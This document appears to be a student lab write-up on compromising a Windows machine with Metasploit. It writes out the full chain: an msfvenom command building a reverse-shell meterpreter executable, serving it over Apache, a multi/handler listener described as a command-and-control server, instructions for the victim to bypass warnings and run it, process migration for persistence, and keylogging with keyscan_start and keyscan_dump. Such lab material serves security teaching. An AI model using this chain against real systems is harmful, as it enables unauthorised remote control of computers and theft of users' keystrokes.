# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

### OUTPUT:

<img width="576" alt="image" src="https://github.com/user-attachments/assets/c06b56b4-a982-40a1-9e7f-7c044328aa84">

Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.175 -f exe > fun.exe

<img width="713" alt="image" src="https://github.com/user-attachments/assets/1686c359-94b9-4c61-a93a-df218cdedef9">

copy the fun.exe into the apache /var/www/html folder 

<img width="343" alt="image" src="https://github.com/user-attachments/assets/51ce9b94-49e1-4733-9c4a-3c444bfd0a67">

Start apache server sudo systemctl apache2 start

<img width="359" alt="image" src="https://github.com/user-attachments/assets/bfb3314a-07c3-4406-a31d-f70c0c25abdb">

Check the status of apache2

<img width="874" alt="image" src="https://github.com/user-attachments/assets/040700eb-7642-4493-a10b-d86426b48140">

Invoke msfconsole:

<img width="602" alt="image" src="https://github.com/user-attachments/assets/68b5c816-db23-4fe9-852a-ff1b57819edd">

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="827" alt="image" src="https://github.com/user-attachments/assets/b256e88b-fdb7-4604-a3dc-f409383e0d2e">

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

<img width="855" alt="image" src="https://github.com/user-attachments/assets/009ecb37-5fd2-42c5-868d-71a1a2b71f90">

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.4/fun.exe The file "fun.exe" downloads.

<img width="863" alt="image" src="https://github.com/user-attachments/assets/f400d3ac-5d05-460a-8a24-f405783608d2">

Bypass any warning boxes, double-click the file, and allow it to run.

<img width="863" alt="image" src="https://github.com/user-attachments/assets/76fa470b-736b-446c-b10c-2cf034799234">

On kali give the command exploit

<img width="577" alt="image" src="https://github.com/user-attachments/assets/4f20f78f-270f-47f3-8176-4a26ed593b9e">

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

<img width="857" alt="image" src="https://github.com/user-attachments/assets/37f8c6c2-888b-4d46-a447-89c291975d3c">

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

<img width="781" alt="image" src="https://github.com/user-attachments/assets/0aa5dfee-8bf2-4683-999b-c0fb8cc13b14">
<img width="619" alt="image" src="https://github.com/user-attachments/assets/8c6078c0-ec91-46c7-8a9e-de53239c0e24">


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump Shows the keystrokes captured so far 

![image](https://github.com/user-attachments/assets/ae4261ce-8ebe-4f5e-ae04-89afacdfeeb4)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
